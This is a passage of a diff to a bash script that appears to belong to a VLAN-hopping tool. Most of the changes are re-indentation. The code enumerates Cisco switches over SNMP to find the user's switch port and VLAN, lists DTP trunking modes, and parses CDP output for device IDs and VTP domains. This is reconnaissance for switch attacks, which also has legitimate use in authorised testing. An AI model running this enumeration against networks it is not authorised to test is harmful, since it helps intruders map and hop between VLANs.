+        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
+        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
+        VLANID2="1"
+        echo "$YOURPORT" >yourport.tmp
+          #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
 
-if [ "$COUNTVLANS" = 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
-		
-else
+          COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
 
-printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."
+            if [ $COUNTPORTLENGTH -gt 2 ]
+              then
+                alterportint
+            fi
+      else
+        printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
+        printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"
 
-paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
-IDNAMES=$(cat idsnames.tmp)
-printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
-printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
-printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+        for VLANID2 in $(cat ids.tmp)
+        do
 
-fi
-FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
-YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)
+        FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
+        if [ -n "$FINDMYPORT2" ]
+          then
+            printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
+            VLANID3=$VLANID2
+        fi
 
-if [ "$YOURPORT" != "OID" ]
-	then
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
-		VLANID2="1"
-		echo "$YOURPORT" >yourport.tmp
-			#detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
+        #FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
+        YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
+        done
 
-			COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
+        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
+        echo "$YOURPORT2" >yourport.tmp
+          #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
 
-				if [ $COUNTPORTLENGTH -gt 2 ]
-					then
-						alterportint
-				fi
-		
-	else
-		
-		printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
-		printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"
+          COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1|awk '{print $NF}' |wc -L)
 
-		for VLANID2 in $(cat ids.tmp) 
-		do
-		
-		FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
-		if [ -n "$FINDMYPORT2" ]
-			then
-				printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
-				VLANID3=$VLANID2
-		fi
-		
-		#FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
-		YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
-		done
-		
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
-		echo "$YOURPORT2" >yourport.tmp
-			#detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
+            if [ $COUNTPORTLENGTH -gt 2 ]
+              then
+                alterportint
+            fi
+    fi
+  }
 
-			COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1|awk '{print $NF}' |wc -L)
+  #list DTP modes on all ports
+  dtplistmodesro() {
+    snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13" 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" | sed -e "s/iso.3.6.1.4.1.9.9.46.1.6.1.1.13./Switch Port /g" >listmodes.tmp
+    LISTDTPMODESRO=$(cat listmodes.tmp)
+    printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following DTP port modes are configured"
+    printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTDTPMODESRO${NORMAL}"
+  }
 
-				if [ $COUNTPORTLENGTH -gt 2 ]
-					then
-						alterportint
-				fi
-fi
+  #nmap check snmp is open function
+  nmapsnmpro
+  scansnmpcomro
+  vlanextractro
+  dtplistmodesro
 
-}
-
-#list DTP modes on all ports
-dtplistmodesro() {
-snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13" 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" | sed -e "s/iso.3.6.1.4.1.9.9.46.1.6.1.1.13./Switch Port /g" >listmodes.tmp
-LISTDTPMODESRO=$(cat listmodes.tmp)
-printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following DTP port modes are configured"
-printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTDTPMODESRO${NORMAL}"
-}
-
-#nmap check snmp is open function
-nmapsnmpro
-scansnmpcomro
-vlanextractro
-dtplistmodesro
-
-#remove tmp files
-rm *.tmp 2>/dev/null
+  #remove tmp files
+  rm *.tmp 2>/dev/null
 }
 #snmpextract r-o function end
 
 cdpdevicename() {
-DEVID=$(cat $OUTPUT | grep -i "device id:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
-	if [ -z "$DEVID" ]
-			then
-				printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any devices. Perhaps it is not a Cisco device."
-	else
-				printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
-		        printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Cisco device was found."
-				printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
-                printf '\r%s %s \n\n' "${GREEN}$DEVID${NORMAL}"
+  DEVID=$(cat $OUTPUT | grep -i "device id:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
+    if [ -z "$DEVID" ]
+        then
+          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any devices. Perhaps it is not a Cisco device."
+    else
+          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
+              printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Cisco device was found."
+          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
+                  printf '\r%s %s \n\n' "${GREEN}$DEVID${NORMAL}"
 
-	fi
+    fi
 }
 
 cdpnativevlan() {
@@ -832,20 +818,19 @@ NATID=$(cat $OUTPUT | grep -i "native vlan:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;
 }
 
 cdpmandomain() {
-MANDOM=$(cat $OUTPUT |grep -i "domain:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
-	if [ "$MANDOM" = " " ]
-			then
-				printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "The VTP domain appears to be set to NULL on the device. Script will continue."
-	elif [ -z "$MANDOM" ]
-			then
-				printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue."
-	else
-				printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
-				printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Management domains were found."
-				printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
-				printf '\r%s %s \n\n' "${GREEN}$MANDOM${NORMAL}"
-
-	fi
+  MANDOM=$(cat $OUTPUT |grep -i "domain:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
+    if [ "$MANDOM" = " " ]
+        then
+          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "The VTP domain appears to be set to NULL on the device. Script will continue."
+    elif [ -z "$MANDOM" ]
+        then
+          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue."
+    else
+          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
+          printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Management domains were found."
+          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
+          printf '\r%s %s \n\n' "${GREEN}$MANDOM${NORMAL}"
+    fi
 }
 
 cdpmanip() {
